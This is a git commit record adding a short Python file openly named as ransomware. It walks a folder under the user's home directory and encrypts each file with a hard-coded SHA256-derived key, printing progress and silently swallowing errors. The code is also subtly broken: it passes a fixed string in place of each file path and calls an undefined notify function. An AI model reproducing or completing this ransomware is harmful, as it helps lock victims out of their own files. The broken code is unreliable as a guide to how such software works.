11507fbb8edd13628fcd53a2cd71880e90db1c92
max76cuz <mkingston25@knox.nsw.edu.au>
2025-02-14 08:57:23 +1100

    Update ransomware_aes.py

--- ransomware_aes.py
+++ ransomware_aes.py
@@ -1,1 +1,26 @@
+import os
+from random import randint
+from Crypto.Hash import SHA256
+from encrypt_file import encrypt_file
+
+def EMA():
+    paths = [os.getenv('HOME') + "/Desktop/Secret/"]
+    key = "somerandomkey"
+    hashkey = SHA256.new(key.encode()).digest()
+
+    try:
+        for path_to_go in paths:
+            for root, dirs, files in os.walk(path_to_go):
+                for names in files:
+                    print("[+]Encrypting\t" + names)
+                    encrypt_file(hashkey, 'EMW')
+    except Exception as e:
+        pass
+
+    try:
+        notify()
+    except Exception as e:
+        pass
+
+EMA()
 
